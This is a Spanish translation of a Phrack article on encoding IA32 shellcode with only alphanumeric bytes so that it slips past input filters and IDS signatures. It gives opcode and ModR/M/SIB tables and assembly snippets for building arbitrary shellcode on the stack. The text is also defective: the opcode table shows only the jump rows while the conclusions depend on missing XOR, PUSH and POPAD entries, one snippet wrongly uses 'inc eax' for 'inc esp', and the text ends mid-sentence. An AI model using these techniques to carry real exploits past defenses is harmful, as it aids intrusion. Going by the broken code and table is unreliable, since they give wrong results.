                             ==Phrack Inc.==

             Volumen 0x0b, Numero 0x39, Archivo #0x0f de 0x12

|=---------=[ Escribiendo shellcodes alfanumericos para ia32 ]=----------=|
|=-----------------------------------------------------------------------=|
|=--------------------------=[ rix@hert.org ]=---------------------------=|



----| Introduccion

Hoy, mas y mas exploits necesitan ser escritos usando assembler,
particularmente para escribir shellcodes clasicos (para buffer overflows,
o ataques format string,...).

Varios programas ahora alcanzan poderosos filtrados input, usando funciones
como strspn() o strcspn(): previene a la gente de insertar facilmente
shellcodes en diferentes buffers.
En la misma forma, observamos mas y mas IDS detectando secuencias de opcodes
sospechosas, algunas de ellas indicando la presencia de un shellcode.

Una forma de evadir tales tecnicas de coincidencia de patron es usar
polimorfismo, como usando herramientas tales como ADMmutate de K2.
Otra forma de hacer esto va a ser presentada aqui: trataremos de escribir
shellcodes IA32 no filtrables, usando solo caracteres alfanumericos: mas
precisamente, usaremos solo caracteres como '0'->'9','A'->'Z' y 'a'->'z'.

Si podemos escribir tales shellcodes alfanumericos, podremos guardar nuestros
shellcodes casi en donde sea! Vamos a enumerar algunas posibilidades
interesantes:
- inputs filtrados
- variables de entorno
- comandos clasicos, instrucciones y parametros desde protocolos usuales
- nombres de archivo y directorios
- nombres de usuario y passwords
- ...



----| Las instrucciones utilizables

Antes de empezar a pensar acerca de tecnicas particulares, vamos a echar una
mirada primero a las instrucciones de IA32 que seran interesantes para
nosotros.

Primero que todo, algunas convenciones (desde las referencias Intel) que
usaremos en nuestros arrays sumarios:

 <r8>          : indica un registro byte.
 <r32>         : indica un registro doubleword.
 <r/m8>        : indica un registro byte o un byte desde memoria (a traves
                 de un puntero).
 <r/m32>       : indica un registro doubleword o un doubleword desde
                 memoria (a traves de un puntero).
 </r>          : indica que el byte de instruccion es seguido de
                 varios posibles bytes operando. Uno de esos bytes, el
                 "ModR/M byte", nos permite especificar la forma de
                 direccionamiento usada, con la ayuda de campos de 3 bits.

                     ModR/M byte:                 
                     
                    7 6 5 4 3 2 1 0 
                   +---+-----+-----+
                   |mod|  r  | r/m |
                   +---+-----+-----+
                   
                 En este caso, la </r> nos indica que el ModR/M byte
                 contendra un registro operando y un registro o memoria
                 operando.
 <imm8>        : indica un valor de byte inmediato.
 <imm32>       : indica un valor doubleword inmediato.
 <disp8>       : indica un desplazamiento firmado de 8 bits.
 <disp32>      : indica un desplazamiento firmado de 32 bits.
 <...>         : indica que la instruccion necesita posiblemente algunos
                 operandos (eventualmente encodeados en varios bytes operando)

OPCODES ALFANUMERICOS:

Ahora, vamos a recordar todas las instrucciones con opcodes alfanumericos:

opcode hexadecimal | char | instruccion                    | interesante
74 <disp8>         | 't'  | je <disp8>                     | SI
75 <disp8>         | 'u'  | jne <disp8>                    | SI
76 <disp8>         | 'v'  | jbe <disp8>                    | SI
77 <disp8>         | 'w'  | ja <disp8>                     | SI
78 <disp8>         | 'x'  | js <disp8>                     | SI
79 <disp8>         | 'y'  | jns <disp8>                    | SI
7A <disp8>         | 'z'  | jp <disp8>                     | SI

Que podemos deducir directamente de todo esto?

- NO INSTRUCCIONES "MOV":
 => necesitamos encontrar otra forma de manipular nuestros datos.
- NO INSTRUCCIONES ARITMETICAS INTERESANTES ("ADD","SUB",...):
 => solo podemos usar DEC e INC.
 => no podemos usar INC con el registro EAX.
- LA INSTRUCCIONES "XOR":
 => podemos usar XOR con bytes y doublewords.
 => muy interesante para cosas basicas de criptografia.
- INSTRUCCIONES "PUSH"/"POP"/"POPAD":
 => podemos pushear bytes y doublewords directamente en la pila.
 => solo podemos usar POP con los registros EAX,ECX y EDX.
 => parece que vamos a jugar de nuevo con la pila.
- EL TAMA~O DEL OPERANDO OVERRIDE "O16":
 => podemos tambien alcanzar manipulaciones de 16 bits con este prefijo de
    instruccion.
- INSTRUCCIONES "JMP" Y "CMP":
 => podemos realizar algunas comparaciones.
 => no podemos usar directamente valores constantes con CMP.


Ademas, No olvides que los operandos de estas instrucciones (</r>, <imm8>,
<imm32>, <disp8> y <disp32> deben tambien mantenerse alfanumericos. Puede
hacer a nuestra tarea complicada una vez mas...


EL BYTE "ModR/M":

Por ejemplo, observemos el efecto de esta molestia suplementaria en el byte
ModR/M (</r>), particularmente para XOR y CMP.
En el siguiente array, encontraremos todos los valores posibles para este
byte ModR/M, y sus interpretaciones como <r8>/<r32> (ahora primero) y
operandos <r/m> (primer columna).

           <r8>:|  al  |  cl  |  dl  |  bl  |  ah  |  ch  |  dh  |  bh 
          <r32>:| eax  | ecx  | edx  | ebx  | esp  | ebp  | esi  | edi
<r/m>           |      |      |      |      |      |      |      |
--:-------------+------+------+------+------+------+------+------+------
(mod=00)        |      |      |      |      |      |      |      |
[eax]           |00    |08    |10    |18    |20    |28    |30 '0'|38 '8'
[ecx]           |01    |09    |11    |19    |21    |29    |31 '1'|39 '9'
[edx]           |02    |0A    |12    |1A    |22    |2A    |32 '2'|3A
[ebx]           |03    |0B    |13    |1B    |23    |2B    |33 '3'|3B
[<SIB>]         |04    |0C    |14    |1C    |24    |2C    |34 '4'|3C
[<disp32>]      |05    |0D    |15    |1D    |25    |2D    |35 '5'|3D
[esi]           |06    |0E    |16    |1E    |26    |2E    |36 '6'|3E
[edi]           |07    |0F    |17    |1F    |27    |2F    |37 '7'|3F
----------------+------+------+------+------+------+------+------+------
(mod=01)        |      |      |      |      |      |      |      |
[eax+<disp8>]   |40    |48 'H'|50 'P'|58 'X'|60    |68 'h'|70 'p'|78 'x'
[ecx+<disp8>]   |41 'A'|49 'I'|51 'Q'|59 'Y'|61 'a'|69 'i'|71 'q'|79 'y'
[edx+<disp8>]   |42 'B'|4A 'J'|52 'R'|5A 'Z'|62 'b'|6A 'j'|72 'r'|7A 'z'
[ebx+<disp8>]   |43 'C'|4B 'K'|53 'S'|5B    |63 'c'|6B 'k'|73 's'|7B
[<SIB>+<disp8>] |44 'D'|4C 'L'|54 'T'|5C    |64 'd'|6C 'l'|74 't'|7C
[ebp+<disp8>]   |45 'E'|4D 'M'|55 'U'|5D    |65 'e'|6D 'm'|75 'u'|7D
[esi+<disp8>]   |46 'F'|4E 'N'|56 'V'|5E    |66 'f'|6E 'n'|76 'v'|7E
[edi+<disp8>]   |47 'G'|4F 'O'|57 'W'|5F    |67 'g'|6F 'o'|77 'w'|7F
----------------+------+------+------+------+------+------+------+------
(mod=10)        |      |      |      |      |      |      |      |
[eax+<disp32>]  |80    |88    |90    |98    |A0    |A8    |B0    |B8
[ecx+<disp32>]  |81    |89    |91    |99    |A1    |A9    |B1    |B9
[edx+<disp32>]  |82    |8A    |92    |9A    |A2    |AA    |B2    |BA
[ebx+<disp32>]  |83    |8B    |93    |9B    |A3    |AB    |B3    |BB
[<SIB>+<disp32>]|84    |8C    |94    |9C    |A4    |AC    |B4    |BC
[ebp+<disp32>]  |85    |8D    |95    |9D    |A5    |AD    |B5    |BD
[esi+<disp32>]  |86    |8E    |96    |9E    |A6    |AE    |B6    |BE
[edi+<disp32>]  |87    |8F    |97    |9F    |A7    |AF    |B7    |BF
---+------------+------+------+------+------+------+------+------+------
(mod=11)        |      |      |      |      |      |      |      |
al | eax        |C0    |C8    |D0    |D8    |E0    |E8    |F0    |F8
cl | ecx        |C1    |C9    |D1    |D9    |E1    |E9    |F1    |F9
dl | edx        |C2    |CA    |D2    |DA    |E2    |EA    |F2    |FA
bl | ebx        |C3    |CB    |D3    |DB    |E3    |EB    |F3    |FB
ah | esp        |C4    |CC    |D4    |DC    |E4    |EC    |F4    |FC
ch | ebp        |C5    |CD    |D5    |DD    |E5    |ED    |F5    |FD
dh | esi        |C6    |CE    |D6    |DE    |E6    |EE    |F6    |FE
bh | edi        |C7    |CF    |D7    |DF    |E7    |EF    |F7    |FF

Que podemos deducir esta vez para XOR y CMP?

- ALGUNAS INSTRUCCIONES "xor [<r32>],dh" Y "xor [<r32>],bh".
- LA INSTRUCCION "xor [<disp32>],dh".
- ALGUNAS INSTRUCCIONES "xor [<r32>+<disp8>],<r8>".
- NO INSTRUCCIONES "xor <r8>,<r8>".

- ALGUNAS INSTRUCCIONES "xor [<r32>],esi" Y "xor [<r32>],edi".
- LA INSTRUCCION "xor [<disp32>],esi".
- ALGUNAS INSTRUCCIONES "xor [<r32>+<disp8>],<r32>".
- NO INSTRUCCIONES "xor <r32>,<r32>".

- ALGUNAS INSTRUCCIONES "xor dh,[<r32>]" Y "xor bh,[<r32>]".
- LA INSTRUCCION "xor dh,[<disp32>]".
- ALGUNAS INSTRUCCIONES "xor <r8>,[<r32>+<disp8>]".

- ALGUNAS INSTRUCCIONES "xor esi,[<r32>]" Y "xor edi,[<r32>]".
- LA INSTRUCCION "xor esi,[<disp32>]".
- ALGUNAS INSTRUCCIONES "xor <r32>,[<r32>+<disp8>]".

- ALGUNAS INSTRUCCIONES "cmp [<r32>],dh" Y "cmp [<r32>],bh".
- LA INSTRUCCION "cmp [<disp32>],dh".
- ALGUNAS INSTRUCCIONES "cmp [<r32>+<disp8>],<r8>".
- NO INSTRUCCIONES "cmp <r8>,<r8>".

- ALGUNAS INSTRUCCIONES "cmp [<r32>],esi" Y "cmp [<r32>],edi".
- LA INSTRUCCION "cmp [<disp32>],esi".
- ALGUNAS INSTRUCCIONES "cmp [<r32>+<disp8>],<r32>".
- NO INSTRUCCIONES "cmp <r32>,<r32>".


EL BYTE "SIB":

Para ser completo, debemos tambien analizar posibilidades ofrecidas por el
byte Scale Index Base ("<SIB>" en nuestro ultimo array). Este byte SIB nos
permite crear direcciones teniendo la siguiente forma:
 <SIB> = <base>+(2^<scale>)*<index>
Donde:
 <base>  : indica un registro base.
 <index> : indica un registro index.
 <scale> : indica un factor escala para el registro index.

Aqui estan los diferentes campos de bit de este byte:

  7 6 5 4 3 2 1 0 
 +---+-----+-----+
 |sc.|index|base |
 +---+-----+-----+

Miremos este ultimo array:

    <base>:| eax  | ecx  | edx  | ebx  | esp  | ebp  | esi  | edi
           |      |      |      |      |      | (if  |      |
(2^<scale>)|      |      |      |      |      |  MOD |      |
*<index>   |      |      |      |      |      | !=00)|      |
----:------+------+------+------+------+------+------+------+------
eax        |00    |01    |02    |03    |04    |05    |06    |07
ecx        |08    |09    |0A    |0B    |0C    |0D    |0E    |0F
edx        |10    |11    |12    |13    |14    |15    |16    |17
ebx        |18    |19    |1A    |1B    |1C    |1D    |1E    |1F
0          |20    |21    |22    |23    |24    |25    |26    |27
ebp        |28    |29    |2A    |2B    |2C    |2D    |2E    |2F
esi        |30 '0'|31 '1'|32 '2'|33 '3'|34 '4'|35 '5'|36 '6'|37 '7'
edi        |38 '8'|39 '9'|3A    |3B    |3C    |3D    |3E    |3F
-----------+------+------+------+------+------+------+------+------
2*eax      |40    |41 'A'|42 'B'|43 'C'|44 'D'|45 'E'|46 'F'|47 'G'
2*ecx      |48 'H'|49 'I'|4A 'J'|4B 'K'|4C 'L'|4D 'M'|4E 'N'|4F 'O'
2*edx      |50 'P'|51 'Q'|52 'R'|53 'S'|54 'T'|55 'U'|56 'V'|57 'W'
2*ebx      |58 'X'|59 'Y'|5A 'Z'|5B    |5C    |5D    |5E    |5F
0          |60    |61 'a'|62 'b'|63 'c'|64 'd'|65 'e'|66 'f'|67 'g'
2*ebp      |68 'h'|69 'i'|6A 'j'|6B 'k'|6C 'l'|6D 'm'|6E 'n'|6F 'o'
2*esi      |70 'p'|71 'q'|72 'r'|73 's'|74 't'|75 'u'|76 'v'|77 'w'
2*edi      |78 'x'|79 'y'|7A 'z'|7B    |7C    |7D    |7E    |7F
-----------+------+------+------+------+------+------+------+------
4*eax      |80    |81    |82    |83    |84    |85    |86    |87
4*ecx      |88    |89    |8A    |8B    |8C    |8D    |8E    |8F
4*edx      |90    |91    |92    |93    |94    |95    |96    |97
4*ebx      |98    |99    |9A    |9B    |9C    |9D    |9E    |9F
0          |A0    |A1    |A2    |A3    |A4    |A5    |A6    |A7
4*ebp      |A8    |A9    |AA    |AB    |AC    |AD    |AE    |AF
4*esi      |B0    |B1    |B2    |B3    |B4    |B5    |B6    |B7
4*edi      |B8    |B9    |BA    |BB    |BC    |BD    |BE    |BF
-----------+------+------+------+------+------+------+------+------
8*eax      |C0    |C1    |C2    |C3    |C4    |C5    |C6    |C7
8*ecx      |C8    |C9    |CA    |CB    |CC    |CD    |CE    |CF
8*edx      |D0    |D1    |D2    |D3    |D4    |D5    |D6    |D7
8*ebx      |D8    |D9    |DA    |DB    |DC    |DD    |DE    |DF
0          |E0    |E1    |E2    |E3    |E4    |E5    |E6    |E7
8*ebp      |E8    |E9    |EA    |EB    |EC    |ED    |EE    |EF
8*esi      |F0    |F1    |F2    |F3    |F4    |F5    |F6    |F7
8*edi      |F8    |F9    |FA    |FB    |FC    |FD    |FE    |FF
-----------+------+------+------+------+------+------+------+------
(if <base> |
   ==ebp   | => <SIB> = <disp32>+(2^<scale>)*<index>
and MOD==0)|
-----------+-------------------------------------------------------

Que podemos deducir de este ultimo array?
- ALGUNAS DIRECCIONES SIB "<r32>+esi".
- ALGUNAS DIRECCIONES SIB "<r32>+2*<r32>".
- NO DIRECCIONES SIB "<r32>+4*<r32>" O "<r32>+8*<r32>".


Tambien recuerda que el orden usual de los bytes para una instruccion
completa con posibles ModR/M, byte SIB y disp8/disp32 es:
 <opcode> [Mode R/M byte] [<SIB>] [<disp8>/<disp32>]

LA INSTRUCCION "XOR":

Notamos que tenemos algunas posibilidades para la instruccion XOR. Vamos a
recordar brevemente todas las combinaciones logicas posibles:

a | b | a XOR b (=c)
--+---+-------------
0 | 0 |    0
0 | 1 |    1
1 | 0 |    1
1 | 1 |    0

Que podemos deducir de esto?
-  a XOR a = 0
 => podemos inicializar facilmente los registros a 0.
-  0 XOR b = b
 => podemos cargar facilmente valores en registro conteniendo 0.
-  1 XOR b = NOT b
 => podemos invertir valores facilmente usando registros conteniendo
    0xFFFFFFFF.
-  a XOR b = c
   b XOR c = a
   a XOR c = b
 => podemos encontrar facilmente un complemento de XOR del byte.



----| Manipulaciones clasicas


Ahora, vamos a ver varios metodos permitiendo alcanzar un maximo de
manipulaciones usuales de bajo nivel desde las instrucciones autorizadas
listadas arriba.


INICIALIZANDO REGISTROS CON VALORES PARTICULARES:

Primero que todo, pensemos acerca de un metodo que nos permite inicializar
algunos valores particulares muy utiles en nuestros registros, como 0 o
0xFFFFFFFF (lee alphanumeric_initialize_registers() en asc.c).
Por ejemplo:

 push 'aaaa'                      ; 'a' 'a' 'a' 'a'
 pop eax                          ;EAX ahora contiene 'aaaa'.
 xor eax,'aaaa'                   ;EAX ahora contiene 0.

 dec eax                          ;EAX ahora contiene 0xFFFFFFFF.

Vamos a memorizar esos valores especiales en registros particulares, para
poder usarlos facilmente.


INICIALIZANDO TODOS LOS REGISTROS:

Al comienzo de nuestro shellcode, necesitaremos inicializar varios registros
con valores que probablemente usaremos despues.
No olvides que no podemos usar POP con todos los registros (solo EAX,ECX y
EDX) Usaremos entonces POPAD. Por ejemplo, si suponemos que EAX contiene 0
y ECX contiene 'aaaa', podemos inicializar todos los registros facilmente:

 push eax                         ;EAX contendra 0.
 push ecx                         ;no hay cambios para ECX ('aaaa').
 push esp                         ;EDX contendra ESP despues POPAD.
 push eax                         ;EBX contendra 0.
 push esp                         ;no hay cambios para ESP.
 push ebp                         ;no hay cambios para EBP.
 push ecx                         ;ESI contendra 'aaaa' despues POPAD.
 dec eax                          ;EAX contendra 0xFFFFFFFF.
 push eax                         ;EDI contendra 0xFFFFFFFF.
 popad                            ;obtenemos todos los valores de la pila.


COPIANDO DESDE REGISTROS A REGISTROS:

Usando POPAD, podemos tambien copiar datos desde cualquier registro a
cualquier registro, si no podemos hacer PUSH/POP directamente. Por ejemplo,
copiando EAX a EBX:

 push eax                         ;sin cambio.
 push ecx                         ;sin cambio.
 push edx                         ;sin cambio.
 push eax                         ;EBX contendra EAX despues POPAD.
 push eax                         ;sin cambio (ESP no "popeado").
 push ebp                         ;sin cambio.
 push esi                         ;sin cambio.
 push edi                         ;sin cambio.
 popad

Notemos que el valor de ESP es cambiado antes del PUSH desde que tenemos 2
PUSH precediendolo, pero POPAD POPea todos los registros excepto ESP desde
la pila.


SIMULANDO UNA INSTRUCCION "NOT":

Usando XOR, podemos realizar facilmente una instruccion NOT clasica. Supon
que EAX contiene el valor que queremos invertir, y EDI contiene 0xFFFFFFFF:

 push eax                         ;pusheamos el valor que queremos invertir.
 push esp                         ;pusheamos el offset del valor que habiamos
                                  ; pusheado en la pila.
 pop ecx                          ;ECX ahora contiene este offset.
 xor [ecx],edi                    ;invertimos el valor.
 pop eax                          ;lo obtenemos de nuevo en EAX.


LEYENDO BYTES DESDE MEMORIA A UN REGISTRO:

Una vez mas, usando XOR y el valor 0 (aqui en EAX), podemos leer un byte
arbitrario en DH:

 push eax                         ;pusheamos 0 en la pila.
 pop edx                          ;lo obtenemos de nuevo en ECX
                                  ;(DH es ahora 0).
 xor dh,[esi]                     ;leemos nuestro byte usando [esi] como
                                  ;direccion fuente.

Podemos tambien leer valores no lejos de [esp] en la pila, usando DEC/INC en
ESP, y despues usando un POP clasico.


ESCRIBIENDO BYTES ALFANUMERICOS A MEMORIA:

Si necesitamos un peque~o lugar para escribir bytes, podemos usar PUSH
facilmente y escribir nuestros bytes decrementando direcciones de memoria
y jugando con INC en ESP.

 push 'cdef'                      ;                 'c' 'd' 'e' 'f'
 push 'XXab'                      ; 'X' 'X' 'a' 'b' 'c' 'd' 'e' 'f'
 inc esp                          ;     'X' 'a' 'b' 'c' 'd' 'e' 'f'
 inc esp                          ;         'a' 'b' 'c' 'd' 'e' 'f'

Ahora, ESP apunta a un string "abcdef" escrito en la pila...
Podemos tambien usar el prefijo de instruccion 016 para pushear directamente
un valor de 16 bits:

 push 'cdef'                      ;         'c' 'd' 'e' 'f'
 push 'ab'                        ; 'a' 'b' 'c' 'd' 'e' 'f'



----| Los metodos


Ahora, combinemos algunas de estas interesantes manipulaciones para generar
shellcodes alfanumericos efectivamente.
Vamos a generar un motor alfanumerico, que construira nuestro shellcode
(no-alfanumerico) original. Propondremos 2 tecnicas diferentes:


USANDO LA PILA:

Ya que tenemos un set de instrucciones relacionadas a la pila, vamos a
usarlas eficientemente.
En realidad, vamos a construir nuestro codigo original gradualmente mientras
pusheamos valores en la pila, desde el ultimo byte (B1) de nuestro shellcode
original al primero (lee alphanumeric_stack_generate() y la opcion "-m stack"
en asc.c):

 .... 00  00  00  00  00  00  00  00  00  00  00  00  SS  SS  SS  SS ....

 .... 00  00  00  00  00  00  00  00  00  00  B2  B1  SS  SS  SS  SS ....
                                              <-----
 .... 00  00  00  00  00  00  00  B5  B4  B3  B2  B1  SS  SS  SS  SS ....
                                  <-----------------
 .... 00  00  00  B9  B8  B7  B6  B5  B4  B3  B2  B1  SS  SS  SS  SS ....
                  <-------shellcode original--------

Donde: SS representa bytes ya presentes en la pila.
       00 representa bytes no usados en la pila.
       Bx representa bytes de nuestro shellcode no-alfanumerico original.

Es realmente facil, porque tenemos instrucciones para pushear doublewords o
words, y podemos tambien jugar con INC ESP para simplemente pushear un byte.
El problema es que no podemos pushear directamente bytes no-alfanumericos.
Vamos a tratar de clasificar bytes de nuestro codigo original en diferentes
categorias. (lee alphanumeric_get_category() en asc.c).
Podemos de esta manera escribir minusculos bloques de 1,2,3 o 4 bytes desde
la misma categoria en la pila (lee alphanumeric_stack_generate_push() en
asc.c).
Observemos como realizar esto:

- CATEGORY_00:
 Suponemos que el registro (<r>,<r32>,<r16>) contiene el valor 0xFFFFFFFF.)
 
  1 BYTE:
   inc <r32>                      ;<r32> ahora contiene 0.
   push <r16>                     ; 00  00
   inc esp                        ;     00
   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.
   
  2 BYTES:
   inc <r32>                      ;<r32> ahora contiene 0.
   push <r16>                     ; 00  00
   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.   

  3 BYTES:
   inc <r32>                      ;<r32> ahora contiene 0.
   push <r32>                     ; 00  00  00  00
   inc esp                        ;     00  00  00
   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.      

  4 BYTES:
   inc <r32>                      ;<r32> ahora contiene 0.
   push <r32>                     ; 00  00  00  00
   dec <r32>                      ;<r32> ahora contiene 0xFFFFFFFF.

- CATEGORY_FF_
 Usamos el mismo mecanismo que para CATEGORY_00, excepto que no necesitamos
 INC/DECrementar el registro conteniendo 0xFFFFFFFF.

- CATEGORY_ALPHA:
 Simplemente pusheamos los valores alfanumericos en la pila, posiblemente
 usando un byte alfanumerico al azar "??" para llenar el doubleword o el
 word.
 
  1 BYTE:
   push 0x??B1                    ; ??  B1
   inc esp                        ;     B1

  2 BYTES:
   push 0xB2B1                    ; B2  B1

  3 BYTES:
   push 0x??B3B2B1                ; ??  B3  B2  B1
   inc esp                        ;     B3  B2  B1

  4 BYTES:
   push 0xB4B3B2B1                ; B4  B3  B2  B1    

- CATEGORY_XOR:
 Elegimos bytes alfanumericos al azar X1,X2,X3,X4 e Y1,Y2,Y3,Y4, por lo que
 X1 xor Y1 = B1, X2 xor Y2 = B2, X3 xor Y3 = B3 y X4 xor Y4 = B4
 (lee alphanumeric_get_complement() en asc.c).

  1 BYTE:
   push 0x??X1                    ; ??  X1
   pop ax                         ;AX ahora contiene 0x??X1.
   xor ax,0x??Y1                  ;AX ahora contiene 0x??B1.
   push ax                        ; ??  B1
   inc esp                        ;     B1
  
  2 BYTES:
   push 0xX2X1                    ; X2  X1
   pop ax                         ;AX ahora contiene 0xX2X1.
   xor ax,0xY2Y1                  ;AX ahora contiene 0xB2B1.
   push ax                        ; B2  B1

  3 BYTES:
   push 0x??X3X2X1                ; ??  X3  X2  X1
   pop eax                        ;EAX ahora contiene 0x??X3X2X1.
   xor eax,0x??Y3Y2Y1             ;EAX ahora contiene 0x??B3B2B1.
   push eax                       ; ??  B3  B2  B1
   inc eax                        ;     B3  B2  B1

  4 BYTES:
   push 0xX4X3X2X1                ; X4  X3  X2  X1
   pop eax                        ;EAX ahora contiene 0xX4X3X2X1.
   xor eax,0xY4Y3Y2Y1             ;EAX ahora contiene 0xB4B3B2B1.
   push eax                       ; B4  B3  B2  B1

- CATEGORY_ALPHA_NOT y CATEGORY_XOR_NOT:
 Simplemente generamos bytes (N1,N2,N3,N4) de CATEGORY_ALPHA y CATEGORY_XOR
